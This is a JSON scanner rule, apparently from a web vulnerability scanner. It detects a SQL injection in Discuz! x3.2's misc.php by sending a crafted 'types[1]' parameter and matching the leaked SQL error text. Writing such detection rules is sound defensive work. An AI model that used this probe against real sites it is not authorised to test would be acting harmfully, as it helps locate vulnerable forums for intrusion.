{
    "target":"discuz",
    "meta":{
        "name":    "Discuz! x3.2 misc.php SQL注入",
        "remarks": "Discuz! x3.2 misc.php 存在SQL注入漏洞",
        "level":   1,
        "type":    "SQL注入",
        "author":   "wolf",
        "references": {
            "url":"",
            "cve":"",
            "kpid":"KP-0050"
        }
    },
    "request":{
        "path":     "misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=aaa",
        "postData": ""
    },
    "verify":{
        "type":  "string",
        "match": "SELECT daytime,`aaa` AS statistic FROM"
    }
}